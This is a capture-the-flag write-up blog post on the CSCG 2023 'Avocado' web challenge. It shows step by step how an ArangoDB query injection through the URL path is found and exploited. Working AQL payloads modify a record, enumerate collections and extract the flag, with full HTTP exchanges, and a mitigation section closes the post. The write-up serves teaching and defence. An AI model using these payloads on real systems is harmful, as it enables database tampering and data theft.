---
layout: post
title: "CSCG 23 - Writeup: Avocado"
categories: ctf, cscg
author:
- Gehim
---
Exploiting an injection vulnerability in the not so well known ArangoDB.

This year i participated in the [CSCG][CSCG] and managed to qualify for the finals again. All participants were required to submit three writeups to be eligible for the final round. I chose this challenge because despite its simplicity only 32 people were able to solve it. Thus, i hope this writeup serves as an educational resource for newer players.

# Overview
- Category: Web
- Difficulty: Easy
- Author: TheVamp
- Solves: 32

> I love avocados! So I created a small website to show what different kinds of avocados exists. Hope you like it :) PS: Be aware that the setup take around 30 Seconds to boot.

We start by exploring the challenge setup. Unfortunately, we do not have the source code available for the challenge website, so we have to collect some intel manually. The website is a simple React application that provides information about different avocado types. Intercepting the network traffic with a proxy tool such as Burp, we can see that the application communicates with a backend API.

```
GET /api/avocado/Bacon HTTP/1.1
Host: XXXXXXXXXXXXXXXX-avocado.challenge.master.cscg.live:31337

HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.3
Date: Mon, 08 May 2023 14:39:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 196
Access-Control-Allow-Origin: *
Connection: close

{"_key": "166", "_id": "avocado_items/166", "_rev": "_f9tH3rS---", "name": "Bacon", "shape": \
"oval", "skin": "smooth", "seed_size": "Medium/Large", "weight": "6-12 ounces", "size": \
"Medium/Large"}
```

Changing the avocado name to something else triggers an interesting error.

```
GET /api/avocado/Hallo HTTP/1.1
Host: XXXXXXXXXXXXXXXX-avocado.challenge.master.cscg.live:31337

HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.3
Date: Mon, 08 May 2023 14:43:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 91
Access-Control-Allow-Origin: *
Connection: close

{"error": "Error in Query: FOR avc in avocado_items FILTER avc.name == 'Hallo' RETURN avc"}
```

The usual next step is to check whether we might be able to inject something in the query. So for example,
we try to insert an single quotation mark to escape from the string.

```
GET /api/avocado/Hallo' HTTP/1.1
Host: XXXXXXXXXXXXXXXX-avocado.challenge.master.cscg.live:31337

HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.3
Date: Mon, 08 May 2023 14:43:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 91
Access-Control-Allow-Origin: *
Connection: close

{"error": "Error in Query: FOR avc in avocado_items FILTER avc.name == 'Hallo'' RETURN avc"}
```

It works. Apparently, special characters are not properly encoded or filtered. This means we can inject a
malicious payload here. However, the database at hand is not your usual SQL database. A quick search
for "avocado database" leads to [https://www.arangodb.com/][arangodb]. ArandoDB is a graph database and the
queries are written in the [ArangoDB Query Language (AOL)][AOL].

# Solution

Usually, in query injection attacks the remaining part of the query is removed by inserting a comment. Since comments in the AOL all start with a forward slash, this is not an option here. Thus, we have to make sure we craft valid queries. If we insert the following payload (do not forget to use proper URL encoding):

```
' OR true UPDATE { _key: 'references', name: "CSCG" } IN avocado_items LET name = '
```

The query executed will be:

```
FOR avc in avocado_items FILTER avc.name == '' OR true UPDATE { _key: 'references', name: "CSCG" } IN avocado_items LET name = '' RETURN avc
```

If we visit the website again, we can see that we successfully changed the name.

```
GET /api/avocado/ HTTP/1.1
Host: XXXXXXXXXXXXXXXX-avocado.challenge.master.cscg.live:31337

HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.3
Date: Mon, 08 May 2023 15:05:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 471
Access-Control-Allow-Origin: *
Connection: close

[
    {"id": "avocado_items/166", "name": "Bacon"},
    {"id": "avocado_items/168", "name": "Fuerte"},
    {"id": "avocado_items/170", "name": "Gem"},
    {"id": "avocado_items/172", "name": "Gwen"},
    {"id": "avocado_items/174", "name": "Hass"},
    {"id": "avocado_items/176", "name": "Lamb Hass"},
    {"id": "avocado_items/178", "name": "Pinkerton"},
    {"id": "avocado_items/180", "name": "Reed"},
    {"id": "avocado_items/182", "name": "Zutano"},
    {"id": "avocado_items/references", "name": "CSCG"}
]
```

Ok, so are able add stuff to the collections, but where is the flag? Luckily, AOL comes with a [bunch of predefined functions][functions] we can use. The most important one is `COLLECTIONS()`, since it returns a list of all available collections in the database. Upon using the following payload:

```
' OR true UPDATE { _key: 'references', name: COLLECTIONS() } IN avocado_items LET name = '
```

We retrieve a list of collections:

```
GET /api/avocado/ HTTP/1.1
Host: XXXXXXXXXXXXXXXX-avocado.challenge.master.cscg.live:31337

HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.3
Date: Mon, 08 May 2023 15:13:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 844
Access-Control-Allow-Origin: *
Connection: close

[
    {"id": "avocado_items/166", "name": "Bacon"},
    {"id": "avocado_items/168", "name": "Fuerte"},
    {"id": "avocado_items/170", "name": "Gem"},
    {"id": "avocado_items/172", "name": "Gwen"},
    {"id": "avocado_items/174", "name": "Hass"},
    {"id": "avocado_items/176", "name": "Lamb Hass"},
    {"id": "avocado_items/178", "name": "Pinkerton"},
    {"id": "avocado_items/180", "name": "Reed"},
    {"id": "avocado_items/182", "name": "Zutano"},
    {"id": "avocado_items/references", "name": [
        {"_id": "128", "name": "_analyzers"},
        {"_id": "143", "name": "_appbundles"},
        {"_id": "140", "name": "_apps"},
        {"_id": "131", "name": "_aqlfunctions"},
        {"_id": "146", "name": "_frontend"},
        {"_id": "125", "name": "_graphs"},
        {"_id": "137", "name": "_jobs"},
        {"_id": "134", "name": "_queues"},
        {"_id": "161", "name": "avocado_items"},
        {"_id": "185", "name": "flag_items_c50044c5"}
        ]
    }
]
```

There we go. The flag is inside the `flag_items_c50044c5` collection. Now we make use of subqueries to extract the flag with

```
' OR true LET flag = (FOR f IN flag_items_c50044c5 RETURN f) UPDATE { _key: 'references', name: flag } IN avocado_items LET name = '
```

Visiting the website again, we are greeted with a juicy flag.

```
GET /api/avocado/ HTTP/1.1
Host: XXXXXXXXXXXXXXXX-avocado.challenge.master.cscg.live:31337

HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.3
Date: Mon, 08 May 2023 15:17:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 594
Access-Control-Allow-Origin: *
Connection: close

[
    {"id": "avocado_items/166", "name": "Bacon"},
    {"id": "avocado_items/168", "name": "Fuerte"},
    {"id": "avocado_items/170", "name": "Gem"},
    {"id": "avocado_items/172", "name": "Gwen"},
    {"id": "avocado_items/174", "name": "Hass"},
    {"id": "avocado_items/176", "name": "Lamb Hass"},
    {"id": "avocado_items/178", "name": "Pinkerton"},
    {"id": "avocado_items/180", "name": "Reed"},
    {"id": "avocado_items/182", "name": "Zutano"},
    {"id": "avocado_items/references", "name": [
        {"_key": "yummy", "_id": "flag_items_c50044c5/yummy",
        "_rev": "_f9tH3r6---", "flag": "CSCG{yummy_4v0c4d0_db_gr4ph_1nj3ct10ns}"}
        ]
    }
]
```

# Mitigation
This is a very classic attack. Every input parameter that is used in a database query needs to be sanitized. It is of utmost importance to escape special character. That way we are unable to escape from the string and forge malicious payloads. Furthermore, it is considered good practise to disable error messages, or at least use a more generic one. This way, even if a potential vulnerability exists, it is more difficult to exploit it in practise.

[AOL]: https://www.arangodb.com/docs/stable/aql/
[CSCG]: https://cscg.de/
[arangodb]: https://www.arangodb.com/
[functions]: https://www.arangodb.com/docs/stable/aql/functions-miscellaneous.html